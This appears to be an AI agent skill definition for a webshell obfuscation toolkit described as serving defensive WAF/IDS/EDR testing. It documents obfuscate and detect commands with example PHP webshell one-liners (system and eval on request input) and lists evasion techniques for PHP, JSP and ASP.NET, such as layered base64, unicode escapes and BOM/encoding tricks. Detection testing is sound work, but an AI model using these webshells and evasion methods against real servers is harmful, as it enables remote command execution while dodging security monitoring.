---
name: webshell-obfuscation
description: Webshell obfuscation toolkit for defensive testing - supports PHP, JSP, ASP.NET obfuscation and pattern detection
triggers:
  - "obfuscate webshell"
  - "webshell encoding"
  - "php obfuscation"
  - "jsp obfuscation"
  - "aspx obfuscation"
---

# webshell-obfuscation Skill

Webshell混淆工具包，用于生成可用于测试WAF/IDS/EDR检测规则的混淆样本。

## Commands

### obfuscate

Generate obfuscated webshell code.

```bash
obfuscate <webshell_code> [--lang php|jsp|aspx|java] [--technique name|all] [--level 1-3]
```

**Parameters:**
- `webshell_code`: The raw webshell code to obfuscate
- `--lang`: Target language (default: php)
- `--technique`: Specific technique or 'all' (default: all)
- `--level`: Obfuscation level 1-3 (default: 2)

**Examples:**
```bash
obfuscate "<?php system(\$_GET['cmd']);?>" --lang php
obfuscate "..." --lang jsp --technique unicode
obfuscate "..." --lang php --technique all --level 3
```

### detect

Check if code matches known webshell detection patterns.

```bash
detect <code>
```

**Examples:**
```bash
detect "<?php @eval(base64_decode(\$_POST['code']));?>"
detect "<%@ page import=\"java.lang.reflect.Field\" %>"
```

### list

List all available techniques.

```bash
list
```

---

## Techniques by Language

**PHP:**
- `base64` - Base64 wrap with eval
- `nested_base64` - Multi-layer base64 encoding
- `hex` - Hex string encoding
- `concat` - String concatenation obfuscation
- `variable_var` - Variable variables (`${${"GET"}}`)
- `polymorphic` - Random variable polymorphic

**JSP:**
- `unicode` - Unicode escape sequences
- `scriptlet` - `<jsp:scriptlet>` tag alternative
- `reflection` - Header-based command via reflection
- `script_engine` - Java ScriptEngine eval
- `xml_encoding` - `<?xml encoding='xxx'?>` encoding
- `page_encoding` - `<%@ page pageEncoding="xxx"%>` directive
- `jsp_directive_page` - `<jsp:directive.page>` alternative
- `double_bom_xml` - BOM + XML encoding (双重编码)
- `double_bom_page` - BOM + pageEncoding (双重编码)
- `triple_encoding` - BOM + XML + pageEncoding (三重编码)
- `xml_format` - Full JSPX XML format

**ASP.NET:**
- `hidden_ns` - Hidden namespace webservice
- `soap` - SOAP format (.asmx)
- `handler` - Generic handler (.ashx)
